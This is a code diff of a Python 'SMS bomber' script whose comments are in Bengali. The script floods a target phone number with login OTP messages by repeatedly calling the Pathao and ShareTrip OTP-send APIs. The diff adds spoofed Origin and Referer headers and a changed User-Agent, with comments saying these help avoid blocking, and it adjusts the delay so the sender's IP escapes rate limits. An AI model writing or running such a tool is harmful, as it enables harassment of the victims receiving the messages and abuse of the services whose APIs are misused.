@@ -10,28 +10,31 @@ def banner():
     print("========================================")
 
 def send_sms(target, count):
-    # ১০০% সচল শক্তিশালী API সমূহ
     url1 = "https://api-hermes.pathao.com/user/otp-send/login"
     url2 = "https://api.sharetrip.net/api/v1/otp/send"
     
+    # শক্তিশালী হেডার্স যা ব্লক এড়াতে সাহায্য করবে
     headers = {
-        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6)",
-        "Content-Type": "application/json"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Content-Type": "application/json",
+        "Origin": "https://pathao.com",
+        "Referer": "https://pathao.com/"
     }
     
     print(f"\n[+] Target Connected: {target}")
     for i in range(count):
         try:
-            # Pathao API (নম্বরের আগে +88 লাগে)
-            requests.post(url1, json={"phone": "+88"+target}, headers=headers)
+            # Pathao API
+            requests.post(url1, json={"phone": "+88"+target}, headers=headers, timeout=10)
             # ShareTrip API
-            requests.post(url2, json={"mobileNumber": target, "type": "login"}, headers=headers)
+            requests.post(url2, json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=10)
             
             print(f"[!] SMS {i+1} Sent Successfully!")
         except:
             print(f"[-] SMS {i+1} Failed")
         
-        time.sleep(8) # একটু গ্যাপ দিন যেন আপনার IP ব্লক না হয়
+        # ১০ সেকেন্ড গ্যাপ দিন, এতে সার্ভার আপনাকে ব্লক করবে না
+        time.sleep(10)
 
 def main():
     banner()
@@ -41,6 +44,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-  
-
 
